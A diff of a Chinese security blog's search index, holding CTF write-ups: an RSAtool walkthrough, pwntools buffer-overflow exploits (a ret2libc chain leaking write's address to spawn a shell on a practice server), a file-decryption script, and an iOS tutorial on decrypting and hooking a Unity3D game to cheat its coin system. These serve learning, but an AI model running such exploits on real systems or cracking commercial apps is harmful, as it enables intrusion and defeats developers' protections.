@@ -36,6 +36,39 @@
       </tags>
   </entry>
   <entry>
+    <title>RSAtool使用方法</title>
+    <url>/2016/08/19/RSAtools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p>最近在做CTF的时候遇到几道RSA的解密题目，网上介绍了RSAtool这款工具，在网上找了一部分资料，也没有相关的使用方法，自己总结了一下，写下来和大家一起分享。<br><a id="more"></a><br>RSAtool是一个非常方便实用的小工具，可以用来计算RSA中的几个参数、生成密钥、加解密，一些不太复杂的破解工作也可以用它。</p>
+<p>这里就不在RSA算法上多做研究了，直接通过两个CTF例子直观体现吧。</p>
+<h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><pre><code>还记得veryeasy RSA吗？是不是不难？那继续来看看这题吧，这题也不难。
+已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥：
+(N=322831561921859 e = 23)
+请解密出明文，提交时请将数字转化为ascii码提交
+比如你解出的明文是0x6162，那么请提交字符串ab
+提交格式:PCTF{明文字符串}
+</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools4.png" alt=""></p>
+<p>图中的P、Q、R、D、E分别就是RSA算法中的p、q、N、d、e，右上角选择进制，注意不要弄错，e只有十六进制可用，所以这里要把23换成17。</p>
+<p>将N=322831561921859填入，左下角有一个Factor N的按钮，这是分解N的意思，点一下，会自动开始分解因数，得到P=13574881、Q=23781539，再点一下Calc. D，计算出d=42108459725927，这时可以看到Test按钮不再是灰色，表明可以使用简单的加解密功能，点它，弹出一个框。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools3.png" alt=""></p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools2.png" alt=""></p>
+<p>第一个框是明文，第二个框是密文，输入明文123456，点击Encrypt，得到密文1464305227134，这时就可以使用解密功能（好像必须先用一次加密才行）。</p>
+<p>密文0xdc2eeeb2782c，换算十进制242094131279916，点Decrypt，直接得到字符串3a5Y。</p>
+<h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><pre><code>已知RSA公钥生成参数：
+p = 3487583947589437589237958723892346254777 
+q = 8767867843568934765983476584376578389
+e = 65537
+求d = 
+请提交PCTF{d}
+</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools1.png" alt=""></p>
+<p>直接将p，q填入，将e的值65537转换成10进制10001，之后计算d的值就可以了。</p>
+]]></content>
+      <tags>
+        <tag>密码学</tag>
+        <tag>工具</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>X-MAN(level0~level2)</title>
     <url>/2017/02/24/X-MAN-level0-level2/</url>
     <content><![CDATA[<p>题目资源在<a href="https://www.jarvisoj.com" target="_blank" rel="external">这里</a><br><a id="more"></a><br>这几个题目比较简单，就不一一详细描述了，exp如下：</p>
@@ -92,6 +125,55 @@ shelladd=0x00600a90
 rdiret=0x00000000004006b3
 
 payload=&apos;a&apos;*128+&quot;b&quot;*8+p64(rdiret)+p64(shelladd)+p64(systemadd)
+
+p.send(payload)
+p.interactive()
+</code></pre>]]></content>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>X-MAN-level3</title>
+    <url>/2017/02/24/X-MAN-level3/</url>
+    <content><![CDATA[<p>本题主要考察通过延迟绑定技术泄漏函数的真实地址，<a href="http://yunnigu.dropsec.xyz/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">延迟绑定技术</a>,通过GDB调试会发现程序开启了NX保护。而且也找不到system函数和bin/sh，<br><a id="more"></a><br>首先需要泄漏write函数的地址用来求出system和bin/sh的实际地址，构造payload=‘A’*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)<br>返回地址改为溢出发现的函数地址是为了接下来第二个payload的构造，因为函数每次运行的个函数的实际地址是不同的。后面的三个是write函数的三个参数，通过延迟绑定原理将write的实际地址写出来。</p>
+<p>第二个payload就是直接修改返回地址为system真实地址再加上bin/sh的地址就可以实现利用。脚本如下：</p>
+<pre><code>from pwn import *
+
+#p=process(&apos;./level3&apos;)
+#libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
+#context.log_level = &apos;debug&apos;
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9879)
+
+level2=ELF(&apos;./level3&apos;)
+libc=ELF(&apos;libc-2.19.so&apos;)
+#offest
+writeoffest = libc.symbols[&apos;write&apos;]
+print writeoffest
+systemoffest = libc.symbols[&apos;system&apos;]
+print systemoffest
+binshoffest=0x0016084C
+#plt
+writeplt=0x08048340
+#got
+writegot=0x0804A018
+#addr
+basebss = 0x0804A024
+pop3ret = 0x08048519
+vuladdr = 0x0804844B
+
+payload=&apos;A&apos;*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)
+
+p.recvuntil(&apos;Input:\n&apos;)
+p.send(payload)
+writeaddr=u32(p.recv(4))
+print writeaddr
+
+systemaddr = writeaddr - writeoffest + systemoffest
+binshaddr = writeaddr - writeoffest + binshoffest
+
+payload=&apos;a&apos;*140+p32(systemaddr)+p32(4)+p32(binshaddr)
 
 p.send(payload)
 p.interactive()
@@ -305,62 +387,6 @@ gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数�
       </tags>
   </entry>
   <entry>
-    <title>iOS免越狱hook————Unity3D游戏修改</title>
-    <url>/2020/06/04/iOS%E5%85%8D%E8%B6%8A%E7%8B%B1hook%E2%80%94%E2%80%94%E2%80%94%E2%80%94Unity3D%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/</url>
-    <content><![CDATA[<p>所谓免越狱Hook就是在iOS设备未进行越狱操作的前提下，对APP进行Hook操作，很久之前就有听说过，昨天花了一天时间整环境外加测试，然后又顺带修改了一个比较让人烦恼的游戏，Unity3D破解其实很早就搞过了，这次借着免越狱Hook一起分享给大家。</p>
-<a id="more"></a>
-<h1 id="工欲善其事必先利其器"><a href="#工欲善其事必先利其器" class="headerlink" title="工欲善其事必先利其器"></a>工欲善其事必先利其器</h1><ul>
-<li>越狱iPhone(必须)<br>虽然最终修改之后的APP是要装到非越狱的iPhone上，但是APP需要砸壳，外加PP助手下架之后没啥好地方下载砸壳之后的ipa了，因此必须要有一部越狱的iPhone。</li>
-<li>未越狱iPhone<br>这个不用说了，目标APP安装</li>
-<li>MonKeyDev<br>AloneMonkey大佬的作品，Hook插件编写神器，大佬还在其中集成了iOSOpenDev，同时也是非越狱插件开发集成的神器。<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85" target="_blank" rel="external">官方安装指南</a></li>
-<li>frida-ios-dump<br>AloneMonkey大佬的又一力作，砸壳神器，iOS逆向一年多了，目前为止无往不利<br>iOS frida安装 <a href="https://frida.re/docs/ios/" target="_blank" rel="external">官方安装指南</a><br>frida-ios-dump使用 <a href="https://frida.re/docs/ios/" target="_blank" rel="external">项目地址</a></li>
-<li>IDA<br>分析砸壳后的APP，导入符号表python脚本方便分析</li>
-<li>Il2CppDumper<br><a href="https://github.com/Perfare/Il2CppDumper" target="_blank" rel="external">项目地址</a><br>Unity3D游戏分析利器，Unity转换成IL2CPP的符号表提取工具，目前只支持Windows平台，最终生成的符号表脚本导入IDA用</li>
-<li>IPAPatch<br><a href="https://github.com/Naituw/IPAPatch" target="_blank" rel="external">项目地址</a><br>用于重新打包签名ipa并安装到非越狱iPhone上，非常强大。如果不想写Hook插件，也可以采取修改汇编的方式重新打包安装ipa</li>
-<li>汇编码转换器<br><a href="http://www.pc6.com/softview/SoftView_594816.html" target="_blank" rel="external">下载地址</a><br>各种类型汇编代码生成机器码的工具，方便静态修改可执行文件，重打包签名安装</li>
-</ul>
-<h1 id="抽丝剥茧"><a href="#抽丝剥茧" class="headerlink" title="抽丝剥茧"></a>抽丝剥茧</h1><p>如果上诉工具全都准备齐全，那么就就可以开始逆向工作了，作为一个侦探密，平时喜欢玩一些密室游戏，今天修改的这款游戏叫做密室逃脱绝境系列–游乐园，不得不说情节设计的很不错，在一次尝试使用提示功能时，突然发现需要金币，然而免费金币需要看广告，每次只给一枚，但是提示的话费确实逐渐增长的，感觉有被冒犯到，所以有了接下来的一切。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook3.jpg" alt=""></p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook4.jpg" alt=""></p>
-<h2 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h2><p>首先我们需要砸壳后的ipa进行分析，定位到底需要修改什么。</p>
-<p>端口转发</p>
-<pre><code>iproxy 2222 22
-</code></pre><p>首先通过frida查找要砸壳的APP进程</p>
-<pre><code>Mac-mini:frida-ios-dump-master-2 $ frida-ps -U
- PID  Name
-----  -------------------------------------------------
-2911  App Store
-2947  信息
-2980  密室逃脱绝境系列11游乐园
-2936  微信
-2972  设置
-2949  邮件
-2814  AppleIDAuthAgent
-1412  AssetCacheLocatorService
-</code></pre><p>接着运行dump.py即可脱壳</p>
-<pre><code>Mac-mini:frida-ios-dump-master-2 $ python2 dump.py 密室逃脱绝境系列11游乐园
-Start the target app 密室逃脱绝境系列11游乐园
-Dumping 密室逃脱绝境系列11游乐园 to /var/folders/m7/g2v2sbfd19g9kg7sk20n639h0000gn/T
-start dump /var/containers/Bundle/Application/617F2079-957E-4005-92B8-7573FE651A8E/app1.app/app1
-app1.fid: 100%|███████████████████████████████████████████████████████████████| 35.7M/35.7M [00:07&lt;00:00, 5.03MB/s]
-InfoPlist.strings: 213MB [00:44, 4.97MB/s]                                                                         
-0.00B [00:00, ?B/s]Generating &quot;密室逃脱绝境系列11游乐园.ipa&quot;
-</code></pre><h2 id="Unity3D符号表恢复"><a href="#Unity3D符号表恢复" class="headerlink" title="Unity3D符号表恢复"></a>Unity3D符号表恢复</h2><p>在做这一步操作之前，机智的人已经将可执行文件脱到IDA文件中开始分析了，APP脱壳后解压ipa，然后查看app1包内容，主程序可执行文件使我们首要分析目标，一般来说是整个包中最大的那个文件。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook5.jpg" alt=""></p>
-<p>在IDA分析的过程中，我们刚好通过Il2CppDumper来提取符号表，提取符号表需要两个文件，一个是上述的主程序可执行文件，另一个则是符号表文件global-metadata.dat，iOS下该文件位于xxx.app/Data/Managed/Metadata目录下</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook6.jpg" alt=""></p>
-<p>先后选择两个文件之后，程序跳出需要输入Unity version</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook7.png" alt=""></p>
-<p>我们怎么确认到底是用了什么版本的Unity呢，之前一个大佬告诉我只要在IDA里搜索字符串X-Unity-Version即可，调用的地方会出现版本号，我们要找的版本号即2018.4.3f1</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook8.png" alt=""></p>
-]]></content>
-      <tags>
-        <tag>iOS</tag>
-        <tag>Hook</tag>
-        <tag>Unity3D</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>lldb+python让调试更简单</title>
     <url>/2020/05/29/lldb-python%E8%AE%A9%E8%B0%83%E8%AF%95%E6%9B%B4%E7%AE%80%E5%8D%95/</url>
     <content><![CDATA[<p>总所周知，砸壳之后的iOS应用动态调试一般都使用lldb，相较于Android通过AS动态调试smali界面化操作，lldb的命令行无疑显得操作繁琐许多。作为一个合格的懒人，追求简单是我的本能，经过多方资料的收集，了解到lldb+python可极大的提高lldb动态调试效率。简单整理出lldb+python提高iOS动态调试效率的几个函数。<br><a id="more"></a></p>
@@ -567,9 +593,9 @@ io.sendline(payload)
 io.interactive()
 </code></pre>]]></content>
       <tags>
+        <tag>writeup</tag>
         <tag>pwn</tag>
         <tag>漏洞</tag>
-        <tag>writeup</tag>
       </tags>
   </entry>
   <entry>
@@ -781,8 +807,8 @@ r.sendline(payload)
 r.interactive()
 </code></pre>]]></content>
       <tags>
-        <tag>pwn</tag>
         <tag>writeup</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -2633,44 +2659,6 @@ if __name__==&apos;__main__&apos;:
       </tags>
   </entry>
   <entry>
-    <title>reverse之第四更</title>
-    <url>/2017/01/20/reverse%E4%B9%8B%E7%AC%AC%E5%9B%9B%E6%9B%B4/</url>
-    <content><![CDATA[<p>首先读取文件的头四个字节判断是否是0x33465443，不是提示“你打开的不是.ctf加密文件”。<br><a id="more"></a></p>
-<p><img src="http://p1.bqimg.com/567571/a39714c92cd59c03.png" alt=""></p>
-<p>再接着读取了0x10个字节。它用来验证输入的密码是否正确。然后读取了4个字节，它决定了解密数据部分的长度。最后就是根据这个数据长度读取指定的字节数。</p>
-<p><img src="http://p1.bpimg.com/567571/fbd00866b10d1c81.png" alt=""></p>
-<p>整个加密文件有0x61C9个字节。所以真正的数据部分长度不会超过这个大小。观察加密文件头部，很容易找到数据部分的长度。</p>
-<p><img src="http://p1.bqimg.com/567571/d161617008852e03.png" alt=""></p>
-<p>整个文件0x619C个字节都是加密数据，前面的是头部。</p>
-<p>接下来就是解密，输入的密钥经过md5加密得到的16字节作为密钥对数据进行异或，每异或16字节，密钥就自增1，数据段里有部分数据是如下：</p>
-<p><img src="http://i1.piimg.com/567571/9eba76040404226a.png" alt=""><br>规律很明显，由此可以推断这一部分对应的明文是0x00,数据是从43 C9 FD开始加密，很容易推出加密的密钥是0x13,0x82,0xFE,0x47,0xe4,0xb9,0x8e,0xd8,0x68,0xfc,0xa1,0xd5,0x4a,0x4f,0x36,0x2</p>
-<p>解密脚本如下:</p>
-<pre><code>a=&apos;17 86 02 4B E8 BD 92 DC 6C 00 A5 D9 4E 53 3A 06&apos;
-aList=a.split(&apos; &apos;)
-oriList=[]
-for i in aList:
-    oriList.append((int(i,16)-4)&amp;0xff)
-print(oriList)
-f=open(&apos;1.ctf&apos;,&apos;rb&apos;)
-ctfdata=f.read()
-f.close()
-
-f=open(&apos;encrypt.ctf&apos;,&apos;wb&apos;)
-validData=ctfdata[0x2d:]
-for i in range(0,len(validData)):
-    data=int(validData[i].encode(&apos;hex&apos;),16)
-    tmp=data^oriList[i%16]
-    f.write(chr(tmp))
-    oriList[i%16]+=1
-    oriList[i%16]=oriList[i%16]&amp;0xff
-f.close()
-</code></pre>]]></content>
-      <tags>
-        <tag>writeup</tag>
-        <tag>reverse</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>reverse第二更之问鼎杯2106-6-2</title>
     <url>/2016/12/05/reverse%E7%AC%AC%E4%BA%8C%E6%9B%B4%E4%B9%8B%E9%97%AE%E9%BC%8E%E6%9D%AF2106-6-2/</url>
     <content><![CDATA[<p>题目提供了一个exe程序和一个文本readme.txt，txt内容如下：<br><a id="more"></a></p>
@@ -2766,8 +2754,46 @@ name[5]=&apos;b&apos;,name[9]=&apos;0&apos;,name[10]=&apos;_&apos;,name[11]=&apo
 <p>这样就解密了。。。</p>
 ]]></content>
       <tags>
-        <tag>ctf</tag>
         <tag>工具</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>reverse之第四更</title>
+    <url>/2017/01/20/reverse%E4%B9%8B%E7%AC%AC%E5%9B%9B%E6%9B%B4/</url>
+    <content><![CDATA[<p>首先读取文件的头四个字节判断是否是0x33465443，不是提示“你打开的不是.ctf加密文件”。<br><a id="more"></a></p>
+<p><img src="http://p1.bqimg.com/567571/a39714c92cd59c03.png" alt=""></p>
+<p>再接着读取了0x10个字节。它用来验证输入的密码是否正确。然后读取了4个字节，它决定了解密数据部分的长度。最后就是根据这个数据长度读取指定的字节数。</p>
+<p><img src="http://p1.bpimg.com/567571/fbd00866b10d1c81.png" alt=""></p>
+<p>整个加密文件有0x61C9个字节。所以真正的数据部分长度不会超过这个大小。观察加密文件头部，很容易找到数据部分的长度。</p>
+<p><img src="http://p1.bqimg.com/567571/d161617008852e03.png" alt=""></p>
+<p>整个文件0x619C个字节都是加密数据，前面的是头部。</p>
+<p>接下来就是解密，输入的密钥经过md5加密得到的16字节作为密钥对数据进行异或，每异或16字节，密钥就自增1，数据段里有部分数据是如下：</p>
+<p><img src="http://i1.piimg.com/567571/9eba76040404226a.png" alt=""><br>规律很明显，由此可以推断这一部分对应的明文是0x00,数据是从43 C9 FD开始加密，很容易推出加密的密钥是0x13,0x82,0xFE,0x47,0xe4,0xb9,0x8e,0xd8,0x68,0xfc,0xa1,0xd5,0x4a,0x4f,0x36,0x2</p>
+<p>解密脚本如下:</p>
+<pre><code>a=&apos;17 86 02 4B E8 BD 92 DC 6C 00 A5 D9 4E 53 3A 06&apos;
+aList=a.split(&apos; &apos;)
+oriList=[]
+for i in aList:
+    oriList.append((int(i,16)-4)&amp;0xff)
+print(oriList)
+f=open(&apos;1.ctf&apos;,&apos;rb&apos;)
+ctfdata=f.read()
+f.close()
+
+f=open(&apos;encrypt.ctf&apos;,&apos;wb&apos;)
+validData=ctfdata[0x2d:]
+for i in range(0,len(validData)):
+    data=int(validData[i].encode(&apos;hex&apos;),16)
+    tmp=data^oriList[i%16]
+    f.write(chr(tmp))
+    oriList[i%16]+=1
+    oriList[i%16]=oriList[i%16]&amp;0xff
+f.close()
+</code></pre>]]></content>
+      <tags>
+        <tag>writeup</tag>
+        <tag>reverse</tag>
       </tags>
   </entry>
   <entry>
@@ -3737,85 +3763,68 @@ void swap(int *a,int *b)
 ]]></content>
   </entry>
   <entry>
-    <title>RSAtool使用方法</title>
-    <url>/2016/08/19/RSAtools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<p>最近在做CTF的时候遇到几道RSA的解密题目，网上介绍了RSAtool这款工具，在网上找了一部分资料，也没有相关的使用方法，自己总结了一下，写下来和大家一起分享。<br><a id="more"></a><br>RSAtool是一个非常方便实用的小工具，可以用来计算RSA中的几个参数、生成密钥、加解密，一些不太复杂的破解工作也可以用它。</p>
-<p>这里就不在RSA算法上多做研究了，直接通过两个CTF例子直观体现吧。</p>
-<h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><pre><code>还记得veryeasy RSA吗？是不是不难？那继续来看看这题吧，这题也不难。
-已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥：
-(N=322831561921859 e = 23)
-请解密出明文，提交时请将数字转化为ascii码提交
-比如你解出的明文是0x6162，那么请提交字符串ab
-提交格式:PCTF{明文字符串}
-</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools4.png" alt=""></p>
-<p>图中的P、Q、R、D、E分别就是RSA算法中的p、q、N、d、e，右上角选择进制，注意不要弄错，e只有十六进制可用，所以这里要把23换成17。</p>
-<p>将N=322831561921859填入，左下角有一个Factor N的按钮，这是分解N的意思，点一下，会自动开始分解因数，得到P=13574881、Q=23781539，再点一下Calc. D，计算出d=42108459725927，这时可以看到Test按钮不再是灰色，表明可以使用简单的加解密功能，点它，弹出一个框。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools3.png" alt=""></p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools2.png" alt=""></p>
-<p>第一个框是明文，第二个框是密文，输入明文123456，点击Encrypt，得到密文1464305227134，这时就可以使用解密功能（好像必须先用一次加密才行）。</p>
-<p>密文0xdc2eeeb2782c，换算十进制242094131279916，点Decrypt，直接得到字符串3a5Y。</p>
-<h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><pre><code>已知RSA公钥生成参数：
-p = 3487583947589437589237958723892346254777 
-q = 8767867843568934765983476584376578389
-e = 65537
-求d = 
-请提交PCTF{d}
-</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools1.png" alt=""></p>
-<p>直接将p，q填入，将e的值65537转换成10进制10001，之后计算d的值就可以了。</p>
+    <title>iOS免越狱hook————Unity3D游戏修改</title>
+    <url>/2020/06/04/iOS%E5%85%8D%E8%B6%8A%E7%8B%B1hook%E2%80%94%E2%80%94%E2%80%94%E2%80%94Unity3D%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/</url>
+    <content><![CDATA[<p>所谓免越狱Hook就是在iOS设备未进行越狱操作的前提下，对APP进行Hook操作，很久之前就有听说过，昨天花了一天时间整环境外加测试，然后又顺带修改了一个比较让人烦恼的游戏，Unity3D破解其实很早就搞过了，这次借着免越狱Hook一起分享给大家。</p>
+<a id="more"></a>
+<h1 id="工欲善其事必先利其器"><a href="#工欲善其事必先利其器" class="headerlink" title="工欲善其事必先利其器"></a>工欲善其事必先利其器</h1><ul>
+<li>越狱iPhone(必须)<br>虽然最终修改之后的APP是要装到非越狱的iPhone上，但是APP需要砸壳，外加PP助手下架之后没啥好地方下载砸壳之后的ipa了，因此必须要有一部越狱的iPhone。</li>
+<li>未越狱iPhone<br>这个不用说了，目标APP安装</li>
+<li>MonKeyDev<br>AloneMonkey大佬的作品，Hook插件编写神器，大佬还在其中集成了iOSOpenDev，同时也是非越狱插件开发集成的神器。<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85" target="_blank" rel="external">官方安装指南</a></li>
+<li>frida-ios-dump<br>AloneMonkey大佬的又一力作，砸壳神器，iOS逆向一年多了，目前为止无往不利<br>iOS frida安装 <a href="https://frida.re/docs/ios/" target="_blank" rel="external">官方安装指南</a><br>frida-ios-dump使用 <a href="https://frida.re/docs/ios/" target="_blank" rel="external">项目地址</a></li>
+<li>IDA<br>分析砸壳后的APP，导入符号表python脚本方便分析</li>
+<li>Il2CppDumper<br><a href="https://github.com/Perfare/Il2CppDumper" target="_blank" rel="external">项目地址</a><br>Unity3D游戏分析利器，Unity转换成IL2CPP的符号表提取工具，目前只支持Windows平台，最终生成的符号表脚本导入IDA用</li>
+<li>IPAPatch<br><a href="https://github.com/Naituw/IPAPatch" target="_blank" rel="external">项目地址</a><br>用于重新打包签名ipa并安装到非越狱iPhone上，非常强大。如果不想写Hook插件，也可以采取修改汇编的方式重新打包安装ipa</li>
+<li>汇编码转换器<br><a href="http://www.pc6.com/softview/SoftView_594816.html" target="_blank" rel="external">下载地址</a><br>各种类型汇编代码生成机器码的工具，方便静态修改可执行文件，重打包签名安装</li>
+</ul>
+<h1 id="抽丝剥茧"><a href="#抽丝剥茧" class="headerlink" title="抽丝剥茧"></a>抽丝剥茧</h1><p>如果上诉工具全都准备齐全，那么就就可以开始逆向工作了，作为一个侦探密，平时喜欢玩一些密室游戏，今天修改的这款游戏叫做密室逃脱绝境系列–游乐园，不得不说情节设计的很不错，在一次尝试使用提示功能时，突然发现需要金币，然而免费金币需要看广告，每次只给一枚，但是提示的话费确实逐渐增长的，感觉有被冒犯到，所以有了接下来的一切。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook3.jpg" alt=""></p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook4.jpg" alt=""></p>
+<h2 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h2><p>首先我们需要砸壳后的ipa进行分析，定位到底需要修改什么。</p>
+<p>端口转发</p>
+<pre><code>iproxy 2222 22
+</code></pre><p>首先通过frida查找要砸壳的APP进程</p>
+<pre><code>Mac-mini:frida-ios-dump-master-2 $ frida-ps -U
+ PID  Name
+----  -------------------------------------------------
+2911  App Store
+2947  信息
+2980  密室逃脱绝境系列11游乐园
+2936  微信
+2972  设置
+2949  邮件
+2814  AppleIDAuthAgent
+1412  AssetCacheLocatorService
+</code></pre><p>接着运行dump.py即可脱壳</p>
+<pre><code>Mac-mini:frida-ios-dump-master-2 $ python2 dump.py 密室逃脱绝境系列11游乐园
+Start the target app 密室逃脱绝境系列11游乐园
+Dumping 密室逃脱绝境系列11游乐园 to /var/folders/m7/g2v2sbfd19g9kg7sk20n639h0000gn/T
+start dump /var/containers/Bundle/Application/617F2079-957E-4005-92B8-7573FE651A8E/app1.app/app1
+app1.fid: 100%|███████████████████████████████████████████████████████████████| 35.7M/35.7M [00:07&lt;00:00, 5.03MB/s]
+InfoPlist.strings: 213MB [00:44, 4.97MB/s]                                                                         
+0.00B [00:00, ?B/s]Generating &quot;密室逃脱绝境系列11游乐园.ipa&quot;
+</code></pre><h2 id="Unity3D符号表恢复"><a href="#Unity3D符号表恢复" class="headerlink" title="Unity3D符号表恢复"></a>Unity3D符号表恢复</h2><p>在做这一步操作之前，机智的人已经将可执行文件脱到IDA文件中开始分析了，APP脱壳后解压ipa，然后查看app1包内容，主程序可执行文件使我们首要分析目标，一般来说是整个包中最大的那个文件。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook5.jpg" alt=""></p>
+<p>在IDA分析的过程中，我们刚好通过Il2CppDumper来提取符号表，提取符号表需要两个文件，一个是上述的主程序可执行文件，另一个则是符号表文件global-metadata.dat，iOS下该文件位于xxx.app/Data/Managed/Metadata目录下</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook6.jpg" alt=""></p>
+<p>先后选择两个文件之后，程序跳出需要输入Unity version</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook7.png" alt=""></p>
+<p>我们怎么确认到底是用了什么版本的Unity呢，只要在IDA里搜索字符串X-Unity-Version即可，调用的地方会出现版本号，我们要找的版本号即2018.4.3f1</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook8.png" alt=""></p>
+<p>在输入版本号之后，选择3即可</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook9.png" alt=""></p>
+<p>同时在Il2CppDumper的目录下，会生成dump.cs和script.py两个文件</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook10.png" alt=""></p>
+<p>将script.py导入IDA，File——&gt;Script File——&gt;选择script.py<br>该脚本的主要作用是辅助IDA识别IL2CPP表函数名，在加载脚本之前IDA识别的函数形如sub_xxxxxxx</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook11.png" alt=""></p>
+<p>加载脚本之后对函数进行了标记形成格式如类名$$函数名这样的函数</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook12.png" alt=""></p>
+<h2 id="定位修改点"><a href="#定位修改点" class="headerlink" title="定位修改点"></a>定位修改点</h2><p>在将script.py导入IDA之后，我们立刻着手分析dump.cs这个文件，该文件里面解析了游戏相关的属性和函数。</p>
 ]]></content>
       <tags>
-        <tag>writeup</tag>
-        <tag>工具</tag>
-        <tag>密码学</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>X-MAN-level3</title>
-    <url>/2017/02/24/X-MAN-level3/</url>
-    <content><![CDATA[<p>本题主要考察通过延迟绑定技术泄漏函数的真实地址，<a href="http://yunnigu.dropsec.xyz/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">延迟绑定技术</a>,通过GDB调试会发现程序开启了NX保护。而且也找不到system函数和bin/sh，<br><a id="more"></a><br>首先需要泄漏write函数的地址用来求出system和bin/sh的实际地址，构造payload=‘A’*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)<br>返回地址改为溢出发现的函数地址是为了接下来第二个payload的构造，因为函数每次运行的个函数的实际地址是不同的。后面的三个是write函数的三个参数，通过延迟绑定原理将write的实际地址写出来。</p>
-<p>第二个payload就是直接修改返回地址为system真实地址再加上bin/sh的地址就可以实现利用。脚本如下：</p>
-<pre><code>from pwn import *
-
-#p=process(&apos;./level3&apos;)
-#libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
-#context.log_level = &apos;debug&apos;
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9879)
-
-level2=ELF(&apos;./level3&apos;)
-libc=ELF(&apos;libc-2.19.so&apos;)
-#offest
-writeoffest = libc.symbols[&apos;write&apos;]
-print writeoffest
-systemoffest = libc.symbols[&apos;system&apos;]
-print systemoffest
-binshoffest=0x0016084C
-#plt
-writeplt=0x08048340
-#got
-writegot=0x0804A018
-#addr
-basebss = 0x0804A024
-pop3ret = 0x08048519
-vuladdr = 0x0804844B
-
-payload=&apos;A&apos;*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)
-
-p.recvuntil(&apos;Input:\n&apos;)
-p.send(payload)
-writeaddr=u32(p.recv(4))
-print writeaddr
-
-systemaddr = writeaddr - writeoffest + systemoffest
-binshaddr = writeaddr - writeoffest + binshoffest
-
-payload=&apos;a&apos;*140+p32(systemaddr)+p32(4)+p32(binshaddr)
-
-p.send(payload)
-p.interactive()
-</code></pre>]]></content>
-      <tags>
-        <tag>ctf</tag>
-        <tag>pwn</tag>
+        <tag>iOS</tag>
+        <tag>Hook</tag>
+        <tag>Unity3D</tag>
       </tags>
   </entry>
 </search>
